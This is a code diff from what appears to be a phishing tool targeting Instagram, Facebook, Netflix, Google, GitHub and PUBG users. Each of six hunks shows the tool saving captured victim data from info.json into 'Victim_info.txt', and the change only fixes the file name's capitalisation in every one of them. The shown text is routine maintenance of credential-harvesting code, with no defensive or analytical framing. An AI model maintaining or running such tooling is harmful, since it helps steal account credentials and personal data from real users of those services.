@@ -193,7 +193,7 @@ def instagram():
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
@@ -314,7 +314,7 @@ def facebook():
                     df = pd.read_json(r"info.json")
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
@@ -435,7 +435,7 @@ def netflix():
                     df = pd.read_json(r"info.json")
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
@@ -556,7 +556,7 @@ def Google():
                     df = pd.read_json(r"info.json")
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
@@ -678,7 +678,7 @@ def Github():
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
@@ -799,7 +799,7 @@ def Pubg():
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                    victim_file= open("victim_info.txt", "a")
+                    victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
